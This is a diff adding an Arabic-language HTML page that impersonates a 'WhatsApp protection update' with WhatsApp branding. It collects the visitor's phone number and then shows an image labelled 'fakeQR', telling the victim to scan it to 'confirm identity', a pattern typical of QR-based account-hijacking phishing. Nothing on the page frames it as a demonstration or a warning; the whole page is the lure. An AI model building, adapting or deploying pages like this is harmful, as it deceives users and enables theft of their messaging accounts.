@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تحديث حماية WhatsApp</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background: url('https://i.imgur.com/yourWhatsappBackground.png') no-repeat center center fixed;
+      background-size: cover;
+      text-align: center;
+      overflow-x: hidden;
+    }
+    .container {
+      padding: 30px 20px;
+      max-width: 400px;
+      margin: 80px auto;
+      background: rgba(255, 255, 255, 0.95);
+      border-radius: 15px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    .logo {
+      width: 100px;
+      margin: 20px auto;
+    }
+    .input-box {
+      width: 100%;
+      padding: 14px;
+      border: 1px solid #ccc;
+      border-radius: 30px;
+      font-size: 18px;
+      margin-bottom: 20px;
+      text-align: center;
+      box-sizing: border-box;
+    }
+    .btn {
+      background: #25d366;
+      color: white;
+      border: none;
+      padding: 14px 25px;
+      border-radius: 30px;
+      cursor: pointer;
+      font-size: 18px;
+      width: 100%;
+      margin-top: 10px;
+      transition: background 0.3s;
+    }
+    .btn:hover {
+      background: #1ebe57;
+    }
+    .btn-blue {
+      background: #0a7cff;
+    }
+    #qrBox, #thankYou, #loader {
+      display: none;
+    }
+    .qr-img {
+      width: 220px;
+      margin: 20px auto;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+    }
+    #loader {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: fixed;
+      inset: 0;
+      background: rgba(255, 255, 255, 0.95); /* نفس لون الصفحات بعد التحميل */
+      color: #075E54;
+      font-size: 20px;
+      flex-direction: column;
+      z-index: 9999;
+    }
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #25d366;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+<div id="loader">
+  <div class="spinner"></div>
+  جاري تحميل WhatsApp...
+</div>
+
+<div class="container" id="phonePage">
+  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" />
+  <h2>تحديث حماية WhatsApp</h2>
+  <p>أدخل رقم هاتفك لتحديث الحماية</p>
+  <input id="phoneInput" class="input-box" type="text" placeholder="رقم الهاتف" maxlength="10" oninput="this.value=this.value.replace(/[^0-9]/g,'');" />
+  <button class="btn" onclick="goToQR()">متابعة</button>
+</div>
+
+<div class="container" id="qrBox">
+  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" />
+  <h2>مسح QR لتأكيد الهوية</h2>
+  <p>استخدم كاميرا جهازك لمسح رمز QR</p>
+  <img class="qr-img" id="fakeQR" src="WhatsApp Image 2025-11-27 at 1.24.26 PM.jpeg" />
+  <button class="btn-blue btn" onclick="scanSuccess()">تم المسح</button>
+</div>
+
+<div class="container" id="thankYou">
+  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" />
+  <h2>تم التحديث بنجاح</h2>
+  <p>تم تحديث حماية WhatsApp لجهازك. شكراً لتأكيد الهوية.</p>
+  <button class="btn">إنهاء</button>
+</div>
+
+<script>
+  window.onload = function() {
+    document.getElementById('loader').style.display = 'flex';
+    setTimeout(() => {
+      document.getElementById('loader').style.display = 'none';
+      document.getElementById('phonePage').style.display = 'block';
+    }, 2500);
+  }
+
+  function goToQR() {
+    document.getElementById("phonePage").style.display = "none";
+    document.getElementById("qrBox").style.display = "block";
+  }
+
+  function scanSuccess() {
+    document.getElementById("qrBox").style.display = "none";
+    document.getElementById("thankYou").style.display = "block";
+  }
+</script>
+
+</body>
+</html>
